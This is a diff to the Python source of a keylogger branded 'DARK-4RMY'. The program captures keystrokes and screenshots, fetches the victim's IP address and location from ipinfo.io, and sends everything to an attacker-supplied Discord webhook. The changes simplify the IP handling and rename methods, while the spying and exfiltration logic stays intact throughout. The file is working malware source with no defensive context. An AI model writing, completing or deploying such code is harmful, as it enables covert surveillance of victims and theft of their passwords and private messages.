@@ -9,74 +9,38 @@ import shutil
 import sys
 import requests
 
-WEBHOOK = ""
+########################################################################################################################################
+webhook = "YOUR WEBHOOK"
+########################################################################################################################################
 
 class DARK4RMY:
-    def __init__(self, interval=1.5, screenshot_interval=1.5):
+    def __init__(self, interval=1.5):
         self.log = ""
         self.timer = None
-        self.screenshot_timer = None
         self.interval = interval
-        self.screenshot_interval = screenshot_interval
 
     def webhook(self, screenshot_data=None):
-        if not self.log:
-            return
-        
-        ip, city, region, country, loc, org, timezone, googlemaps = self.getip()
-
-        webhook = DiscordWebhook(url=WEBHOOK, username="DARK-4RMY", avatar_url="https://abagond.wordpress.com/wp-content/uploads/2020/07/dark-army.png")
-        embed = DiscordEmbed(title="", description="[DARK-4RMY](https://rvlt.gg/8ez9akZK)", color="000000")
-        embed.set_image(url="https://mir-s3-cdn-cf.behance.net/project_modules/disp/33779762328391.5a8cb66e6f1c5.png")
-        embed.add_embed_field(
-        name="",
-        value=(
-            f"```IP       : {ip}\n"
-            f"City     : {city}\n"
-            f"Region   : {region}\n"
-            f"Country  : {country}\n"
-            f"ISP      : {org}\n"
-            f"Timezone : {timezone}```\n"
-            f"[G Maps](<{googlemaps}>)"
-        ),
-        inline=False
-    )
-
-        embed.add_embed_field(name="", value=f"```{self.log}```", inline=False)
-        webhook.add_embed(embed)
-
-        if screenshot_data:
-            webhook.add_file(file=screenshot_data, filename="screenshot.jpg")
-
-        webhook.execute()
+        ip = self.getip()
+        wh = DiscordWebhook(url=webhook, username="DARK-4RMY", avatar_url="https://abagond.wordpress.com/wp-content/uploads/2020/07/dark-army.png")
+        emb = DiscordEmbed(title="", description="[DARK-4RMY](https://rvlt.gg/8ez9akZK)", color="000000")
+        emb.set_image(url="https://mir-s3-cdn-cf.behance.net/project_modules/disp/33779762328391.5a8cb66e6f1c5.png")
+        emb.add_embed_field(name="", value=f"```{ip}```", inline=False)
+        emb.add_embed_field(name="", value=f"```{self.log}```", inline=False)
+        wh.add_embed(emb)
+        wh.add_file(file=screenshot_data, filename="screenshot.jpg")
+        wh.execute()
         self.log = ""
 
     def getip(self):
-        try:
-            data = requests.get("https://ipinfo.io/json", timeout=5).json()
+        return requests.get("https://ipinfo.io/json").json()
 
-            ip = data.get("ip", "N/A")
-            city = data.get("city", "N/A")
-            region = data.get("region", "N/A")
-            country = data.get("country", "N/A")
-            loc = data.get("loc", "N/A")
-            org = data.get("org", "N/A")
-            timezone = data.get("timezone", "N/A")
-            
-            googlemaps = f"https://www.google.com/maps/search/google+map++{loc}"
-
-            return ip, city, region, country, loc, org, timezone, googlemaps
-
-        except:
-            return None
-    
-    def timer_log(self):
+    def timers(self):
         if self.timer:
             self.timer.cancel()
-        self.timer = Timer(self.interval, self.send_log)
+        self.timer = Timer(self.interval, self.send)
         self.timer.start()
 
-    def send_log(self):
+    def send(self):
         screenshot_data = self.screenshot()
         self.webhook(screenshot_data=screenshot_data)
 
@@ -86,7 +50,7 @@ class DARK4RMY:
                 self.log += key.char
         except:
             pass
-        self.timer_log()
+        self.timers()
 
     def screenshot(self):
         byte = BytesIO()
